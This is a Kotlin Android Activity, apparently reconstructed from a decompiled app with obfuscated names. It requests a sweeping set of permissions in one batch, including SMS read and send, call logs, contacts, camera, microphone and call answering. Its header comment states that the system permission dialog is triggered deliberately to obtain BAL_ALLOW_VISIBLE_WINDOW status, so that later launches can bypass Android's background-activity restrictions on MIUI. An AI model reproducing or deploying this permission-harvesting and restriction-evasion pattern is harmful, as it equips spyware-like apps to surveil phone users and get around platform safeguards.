package com.storm.safe.rock.service.modules.yw5xud.common

import android.app.Activity
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiPermissionRequestActivity

/**
 * Batch permission request Activity for yw5xud authorization flow.
 * Requests POST_NOTIFICATIONS first, then ALL other runtime permissions in one shot.
 * This ensures a system GrantPermissionsActivity dialog appears, giving us
 * BAL_ALLOW_VISIBLE_WINDOW status so subsequent brand engine startActivity calls
 * can reach the foreground on MIUI.
 *
 * JADX: com.storm.safe.rock.service.modules.yw5xud.umrkmgrri (276 lines)
 * Different from p029ui.umrkmgrri which handles single permission_type requests.
 */
class umrkmgrri : Activity() {

    companion object {
        private const val TAG = "PermReqActivity"
        private const val REQUEST_OTHER = 151
        private const val REQUEST_NOTIFICATION = 152
        private const val TIMEOUT_MS = 60000L

        @Volatile
        var isRequestingPermissions: Boolean = false

        /** All runtime permissions to request. JADX: f55160a5 (lazy list). */
        val OTHER_PERMISSIONS: List<String> by lazy {
            buildList {
                add("android.permission.CAMERA")
                if (Build.VERSION.SDK_INT >= 33) {
                    add("android.permission.READ_MEDIA_IMAGES")
                    add("android.permission.READ_MEDIA_VIDEO")
                    add("android.permission.READ_MEDIA_AUDIO")
                }
                if (Build.VERSION.SDK_INT >= 34) {
                    add("android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
                }
                add("android.permission.READ_EXTERNAL_STORAGE")
                add("android.permission.WRITE_EXTERNAL_STORAGE")
                add("android.permission.RECORD_AUDIO")
                add("android.permission.READ_SMS")
                add("android.permission.SEND_SMS")
                add("android.permission.RECEIVE_SMS")
                add("android.permission.RECEIVE_MMS")
                add("android.permission.RECEIVE_WAP_PUSH")
                add("android.permission.READ_CONTACTS")
                add("android.permission.GET_ACCOUNTS")
                add("android.permission.READ_PHONE_STATE")
                add("android.permission.CALL_PHONE")
                add("android.permission.READ_CALL_LOG")
                add("android.permission.WRITE_CALL_LOG")
                add("com.android.voicemail.permission.ADD_VOICEMAIL")
                add("android.permission.USE_SIP")
                add("android.permission.PROCESS_OUTGOING_CALLS")
                add("android.permission.BODY_SENSORS")
                if (Build.VERSION.SDK_INT >= 26) {
                    add("android.permission.READ_PHONE_NUMBERS")
                    add("android.permission.ANSWER_PHONE_CALLS")
                }
                if (Build.VERSION.SDK_INT >= 29) {
                    add("android.permission.ACTIVITY_RECOGNITION")
                    add("android.permission.ACCESS_MEDIA_LOCATION")
                }
                if (Build.VERSION.SDK_INT >= 31) {
                    add("android.permission.BLUETOOTH_SCAN")
                    add("android.permission.BLUETOOTH_CONNECT")
                    add("android.permission.BLUETOOTH_ADVERTISE")
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    add("android.permission.NEARBY_WIFI_DEVICES")
                    add("android.permission.BODY_SENSORS_BACKGROUND")
                }
            }
        }

        fun computeRequiredPermissions(context: android.content.Context): List<String> {
            return HuaweiPermissionRequestActivity.computeRequiredPermissions(context)
        }

        fun start(context: android.content.Context) {
            isRequestingPermissions = true
            Handler(Looper.getMainLooper()).post {
                try {
                    val intent = android.content.Intent(context, umrkmgrri::class.java).apply {
                        flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.w(TAG, "[权限请求] 启动失败: ${e.message}")
                    isRequestingPermissions = false
                }
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var timeoutRunnable: Runnable? = null
    private var notificationHandled = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        isRequestingPermissions = true
        notificationHandled = false

        // Safety timeout: finish after 60s
        val runnable = Runnable { finish() }
        timeoutRunnable = runnable
        handler.postDelayed(runnable, TIMEOUT_MS)

        val brand = Build.BRAND?.lowercase(java.util.Locale.ROOT) ?: ""
        val isHuawei = brand == "huawei" || brand == "honor" || brand == "hihonor"
        val needNotification = isHuawei || Build.VERSION.SDK_INT >= 33

        Log.i(TAG, "╔════════════════════════════════════════════════════════════")
        Log.i(TAG, "║ [通知权限] 开始请求")
        Log.i(TAG, "║ 品牌: $brand, 是华为/荣耀: $isHuawei, SDK: ${Build.VERSION.SDK_INT}")
        Log.i(TAG, "║ 需要请求: $needNotification")

        if (!needNotification) {
            Log.i(TAG, "║ 非华为/荣耀且Android < 13，跳过通知权限")
            Log.i(TAG, "╚════════════════════════════════════════════════════════════")
            requestOtherPermissions()
            return
        }

        val granted = ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") == 0
        Log.i(TAG, "║ 当前状态: ${if (granted) "已授权 ✓" else "未授权 ✗"}")
        Log.i(TAG, "╚════════════════════════════════════════════════════════════")

        if (granted) {
            Log.i(TAG, "[通知权限] 已授权，跳过请求")
            requestOtherPermissions()
        } else {
            Log.i(TAG, "[通知权限] ★★★ 请求系统弹窗... ★★★")
            ActivityCompat.requestPermissions(this, arrayOf("android.permission.POST_NOTIFICATIONS"), REQUEST_NOTIFICATION)
        }
    }

    /** JADX: m212463a0 — request all other permissions. */
    private fun requestOtherPermissions() {
        val needed = OTHER_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != 0
        }
        Log.i(TAG, "╔════════════════════════════════════════════════════════════")
        Log.i(TAG, "║ [第2步] 请求其他权限")
        Log.i(TAG, "║ 需要请求: ${needed.size} 个")
        Log.i(TAG, "╚════════════════════════════════════════════════════════════")

        if (needed.isEmpty()) {
            Log.i(TAG, "[其他权限] 全部已授权，完成")
            Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500L)
            return
        }
        for (p in needed) {
            Log.d(TAG, "[其他权限] - $p")
        }
        ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQUEST_OTHER)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQUEST_NOTIFICATION -> {
                val granted = grantResults.isNotEmpty() && grantResults[0] == 0
                Log.i(TAG, "[通知权限] ★★★ 结果: ${if (granted) "已授权 ✓" else "被拒绝 ✗"} ★★★")
                notificationHandled = true
                requestOtherPermissions()
            }
            REQUEST_OTHER -> {
                var grantCount = 0
                var denyCount = 0
                for (i in permissions.indices) {
                    val result = if (i < grantResults.size) grantResults[i] else -1
                    if (result == 0) grantCount++ else {
                        denyCount++
                        Log.w(TAG, "[其他权限] ${permissions[i]} 被拒绝")
                    }
                }
                Log.i(TAG, "[其他权限] 结果: 授权 $grantCount 个, 拒绝 $denyCount 个")
                Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500L)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (notificationHandled) return
        val granted = ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") == 0
        Log.i(TAG, "[onResume] 通知权限状态: ${if (granted) "已授权" else "未授权"}")
        if (granted && !notificationHandled) {
            Log.i(TAG, "[onResume] ★★★ 检测到通知权限已授权，继续请求其他权限 ★★★")
            notificationHandled = true
            requestOtherPermissions()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        timeoutRunnable?.let { handler.removeCallbacks(it) }
        timeoutRunnable = null
        isRequestingPermissions = false
    }
}
